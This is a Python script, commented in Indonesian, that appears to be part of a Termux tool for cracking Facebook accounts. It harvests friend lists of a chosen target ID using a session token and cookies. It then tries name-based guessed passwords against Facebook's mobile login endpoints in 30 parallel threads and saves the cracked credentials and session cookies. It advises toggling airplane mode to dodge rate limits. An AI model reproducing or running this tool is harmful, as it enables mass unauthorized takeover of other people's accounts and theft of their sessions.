        # Penanganan jika terjadi kesalahan pada request HTTP
        Console().print(f" {H2}• {P2}[bold red]Terjadi masalah koneksi: {req_err}")
    
    except re.error as re_err:
        # Penanganan jika regex gagal
        Console().print(f" {H2}• {P2}[bold red]Gagal mengambil access_token: {re_err}")

    except Exception as e:
        # Penanganan error umum, seperti cookies kadaluwarsa atau tidak valid
        Console().print(f" {H2}• {P2}[bold red]Cookies Kadaluwarsa atau tidak valid")
        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
        print(e)
        time.sleep(3)
        exit()

    except:
        # Exception lain yang tidak diketahui
        pass






# Fungsi untuk menampilkan menu
def menu(my_name, my_id):
    try:
        prem = f"{H2}Premium"
    except (KeyError, FileNotFoundError):
        prem = f"{H2}Premium"

    # Coba membaca token dan cookie dari file
    try:
        with open(".vipertok.txt", "r") as token_file:
            token = token_file.read()
        with open(".vipercok.txt", "r") as cookie_file:
            cookie = cookie_file.read()
    except IOError:
        # Jika file tidak ditemukan atau rusak, hapus file dan lakukan login ulang
        Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa atau tidak ditemukan")
        os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
        time.sleep(3)
        login()

    # Coba mendapatkan teman dari API Facebook
    try:
        response = ses.get(
            f"https://graph.facebook.com/me?fields=friends&access_token={token}",
            cookies={"cookie": cookie},
        ).json()
        
        # Memeriksa apakah data teman tersedia
        if "friends" in response and "data" in response["friends"]:
            for friend in response["friends"]["data"]:
                temanku.append(friend["id"] + "|" + friend["name"])
    except requests.exceptions.RequestException as req_err:
        Console().print(f" {H2}• {P2}[bold red]Gagal mengambil data teman: {req_err}")
    except Exception as e:
        Console().print(f" {H2}• {P2}[bold red]Terjadi kesalahan: {e}")
    
    os.system("clear")
    banner()
    followdong()

    # Membaca lisensi
    try:
        with open(".license", "r") as license_file:
            key = license_file.read()
    except FileNotFoundError:
        key = "-"

    # Mengambil informasi negara dan IP dari API
    try:
        ip_info = requests.get("http://ip-api.com/json/").json()
        negara = ip_info.get("country", "Tidak Diketahui")
        ip = ip_info.get("query", "Tidak Diketahui")
    except requests.exceptions.RequestException as req_err:
        Console().print(f" {H2}• {P2}[bold red]Gagal mengambil data IP: {req_err}")
        negara = "Tidak Diketahui"
        ip = "Tidak Diketahui"

    # Menampilkan informasi lisensi dan IP
    prints(Panel(f"{P2}{negara}", padding=(0, 22), width=60, style=f"{color_panel}"))
    dia.append(
        Panel(
            f"{P2}Lisensi : {H2}{key}\n{P2}Tanggal : {H2}{hari_ini}\n{P2}Jam     : {H2}{hour}\n{P2}Status  : {prem}",
            width=30,
            title=f"{P2}Lisensi",
            style=f"{color_panel}",
        )
    )
    
    # Menampilkan informasi biodata
    dia.append(
        Panel(
            f"{P2}Nama   : {H2}{my_name}\n{P2}ID     : {H2}{my_id}\n{P2}Teman  : {H2}{len(temanku)}\n{P2}IP     : {H2}{ip}",
            title=f"{P2}Bio Data",
            width=30,
            style=f"{color_panel}",
        )
    )

    # Menampilkan menu utama hanya dengan opsi nomor 1 (crack dari ID publik)
    console.print(Columns(dia))
    prints(
        Panel(
            f"""{P2}[{color_text}01{P2}]. Crack dari ID publik""",
            width=60,
            style=f"{color_panel}",
        )
    )
    
    # Menampilkan petunjuk ke menu lain
    prints(
        Panel(
            f"""{P2}Ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",
            width=60,
            style=f"{color_panel}",
        )
    )

    # Input pilihan menu dari user
    HaHi = console.input(f" {H2}• {P2}Pilih menu : ")
    
    # Validasi input dan eksekusi menu yang dipilih
    if HaHi in ["", "1", "01"]:
        dump_publik()
    # Pindah ke menu bot atau lain
    elif HaHi.lower() == "bot":
        botdata().menu()
    elif HaHi.lower() == "lain":
        Lain(cookie).menu()
    else:
        console.print(f" {H2}• {P2}[bold red]Masukkan pilihan yang benar!")
        






# Fungsi untuk dump dari publik
def dump_publik():
    try:
        # Membuka file token dan cookie
        with open(".vipertok.txt", "r") as token_file:
            token = token_file.read()
        with open(".vipercok.txt", "r") as cookie_file:
            cok = cookie_file.read()
    except IOError:
        Console().print(f" {H2}• {P2}[bold red]Error: Token atau Cookies tidak ditemukan!")
        return

    prints(
        Panel(
            f"""{P2}Masukkan ID target, pastikan ID target bersifat publik""",
            subtitle=f"{P2}Ketik {H2}me{P2} untuk dump dari teman sendiri",
            width=60,
            style=f"{color_panel}",
        )
    )
    
    a = console.input(f" {H2}• {P2}Masukkan ID Target : {U2} ")

    # Jika user memasukkan 'me' untuk dump teman sendiri
    if a.lower() == "me":
        try:
            # Meminta data dari API untuk dump teman sendiri
            response = requests.get(
                f"https://graph.facebook.com/me?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            )
            response.raise_for_status()  # Memicu error jika status kode tidak 200 OK
            koH = response.json()

            # Menyimpan data teman ke dalam list id
            if "friends" in koH and "data" in koH["friends"]:
                for friend in koH["friends"]["data"]:
                    id.append(friend["id"] + "|" + friend["name"])
            else:
                Console().print(f" {H2}• {P2}[bold red]Data teman tidak tersedia atau ID bersifat privat!")
            setting()
        
        except requests.exceptions.RequestException as req_err:
            Console().print(f" {H2}• {P2}[bold red]Error permintaan API: {req_err}")
        except KeyError:
            Console().print(f" {H2}• {P2}[bold red]Data tidak ditemukan dalam respons API!")
        except Exception as e:
            Console().print(f" {H2}• {P2}[bold red]Kesalahan: {e}")

    # Jika user memasukkan ID target lain
    else:
        try:
            # Meminta data dari API untuk ID target
            response = ses.get(
                f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            )
            response.raise_for_status()
            b = response.json()

            # Menyimpan data teman ke dalam list id
            if "friends" in b and "data" in b["friends"]:
                for friend in b["friends"]["data"]:
                    id.append(friend["id"] + "|" + friend["name"])
            else:
                Console().print(f" {H2}• {P2}[bold red]ID target tidak memiliki teman publik atau bersifat privat!")
            setting()

        except requests.exceptions.RequestException as req_err:
            Console().print(f" {H2}• {P2}[bold red]Error permintaan API: {req_err}")
        except KeyError:
            Console().print(f" {H2}• {P2}[bold red]Data tidak ditemukan dalam respons API!")
        except Exception as e:
            Console().print(f" {H2}• {P2}[bold red]Kesalahan: {e}")



import random
from rich.panel import Panel

def setting():
    # Menampilkan pilihan metode crack
    Console().print(
        Panel(
            f"{P2}[{color_text}01{P2}] Crack akun Old\n{P2}[{color_text}02{P2}] Crack Akun New\n{P2}[{color_text}03{P2}] Crack Akun Random [bold green](Recommended)[/]",
            title=f"[bold green] {len(id)} Akun Ditemukan",
            width=60,
            style=f"{color_panel}",
        )
    )

    hu = console.input(f" {H2}• {P2}Masukkan Pilihan : ")

    # Pilihan crack akun berdasarkan urutan umur akun
    if hu in ["1", "01"]:
        # Crack akun Old (akun lama)
        id2.extend(sorted(id))
    elif hu in ["2", "02"]:
        # Crack akun New (akun baru)
        muda = sorted(id, reverse=True)
        id2.extend(muda)
    elif hu in ["3", "03"]:
        # Crack akun Random (acak)
        for bacot in id:
            pos = random.randint(0, len(id2))
            id2.insert(pos, bacot)
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilih Yang Benar!")
        return setting()

    # Menggunakan metode login default (validatev1)
    method.append("validatev1")

    # Pengaturan User-Agent (UA)
    Console().print(
        Panel(
            f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
            title=f"[bold green]Setting User-Agent",
            width=60,
            style=f"{color_panel}",
        )
    )

    uatambah = console.input(f" {H2}• {P2}Masukkan Pilihan (Y/T) : ")
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukkan UA Manual : ")
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

    # Hanya menggunakan metode cepat secara default
    metcepat()  # Langsung menggunakan metode cepat





def metcepat():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print('')
    
    # Menampilkan hasil OK dan CP yang tersimpan
    urut = []
    urut.append(panel(f'[bold green]{okc} [bold white]', width=30, title=f"[bold green]OK SAVE", style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]{cpc} [bold white]', width=30, title=f"[bold yellow]CP SAVE", style=f"{color_panel}"))
    wa.print(Columns(urut))
    
    awal = datetime.now()
    
    # Notifikasi untuk mode cepat
    Console().print(Panel(f'[bold white]Hidupkan/matikan Mode Pesawat setiap [bold green]300[bold yellow] ID', 
                          title=f"[bold yellow]CRACK-CEPAT", 
                          width=60, 
                          style=f"{color_panel}"))
    
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('', total=len(id2))
    
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                
                # Membuat list password yang akan dicoba
                pwv = ["rasis123", "rasis1234", "rasis12345", "bismillah"]
                
                if len(nmf) < 6:
                    if len(frs) >= 3:
                        pwv.append(nmf)
                        pwv.append(frs + '321')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                else:
                    pwv.append(nmf)
                    if len(frs) >= 3:
                        pwv.append(frs + '321')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                
                # Jika ada password tambahan dari pengguna
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                
                # Hanya menggunakan metode 'validatev1'
                pool.submit(vipernew, idf, pwv, 'm.prod.facebook.com')
    
    # Menampilkan pesan ketika cracking selesai
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack telah selesai, jangan lupa sholat, Kawan!",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]Cek Opsi",
            width=60,
            style=f"{color_panel}",
        )
    )
    
    # Menampilkan jumlah akun OK dan CP
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")
    







# MULAI CRACK

def reguler(idf, pwv):
    global loop, ok, cp
    ses = requests.Session()
    rr = random.randint
    rc = random.choice

    # Pastikan id dan des didefinisikan
    prog.update(des, description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)

    # Pilihan User-Agent
    ua = random.choice(ugen)
    if "ya" in ualuh:
        ua = ualu[0]
    
    # Looping password
    for pw in pwv:
        try:
            # Mengupdate header session
            ses.headers.update({
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'sec-ch-ua-mobile': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            })

            # Permintaan login
            url = f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin'
            p = ses.get(url)
            
            # Ekstraksi data menggunakan regex
            try:
                lsd = re.search('name="lsd" value="(.*?)"', p.text).group(1)
                jazoest = re.search('name="jazoest" value="(.*?)"', p.text).group(1)
            except AttributeError:
                print("Gagal mengambil data lsd atau jazoest.")
                continue

            dataa = {
                "lsd": lsd,
                "jazoest": jazoest,
                "uid": idf,
                "pass": pw
            }

            # Mengirim POST request dengan data login
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            
            # Cek cookies
            cookies = ses.cookies.get_dict()
            if "c_user" in cookies:
                ok += 1
                coki = po.cookies.get_dict()
                kuki = f"datr={coki['datr']}; sb={coki['sb']}; locale=id_ID; c_user={coki['c_user']}; xs={coki['xs']}; fr={coki['fr']};"
                tree = Tree(Panel.fit(f"{H2}{idf}|{pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio o.mp3")
                open("OK/" + okc, "a").write(f"{idf}|{pw}\n")
                break
            elif "checkpoint" in cookies:
                cp += 1
                tree = Tree(Panel.fit(f"{K2}{idf}|{pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                os.popen("play-audio c.mp3")
                open("CP/" + cpc, "a").write(f"{idf}|{pw}\n")
                ceker(idf, pw)
                akun.append(f"{idf}|{pw}")
                break
        except requests.exceptions.ConnectionError:
            time.sleep(31)
        except Exception as e:
            print(f"Error: {e}")
    loop += 1


import os

# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    # Mengupdate repositori Git
    try:
        os.system("git pull")
    except Exception as e:
        print(f"[bold red]Gagal melakukan git pull: {e}")

    # Membuat direktori yang diperlukan
    directories = [
        "/sdcard/RUDAL-DUMP",
        "OK",
        "/sdcard/FilePayload",
        "CP",
        "data"
    ]
    
    for directory in directories:
        try:
            os.makedirs(directory, exist_ok=True)  # Buat direktori jika belum ada
        except Exception as e:
            print(f"[bold red]Gagal membuat direktori {directory}: {e}")

    # Menginstal play-audio
    try:
        os.system("pkg install play-audio")
    except Exception as e:
        print(f"[bold red]Gagal menginstal play-audio: {e}")

    # Membuat file .prox.txt
    try:
        with open('.prox.txt', 'a'):
            pass  # Hanya untuk membuat file jika tidak ada
    except Exception as e:
        print(f"[bold red]Gagal membuat file .prox.txt: {e}")

    # Membersihkan layar
    try:
        os.system("clear")
    except Exception as e:
        print(f"[bold red]Gagal membersihkan layar: {e}")

    login()

















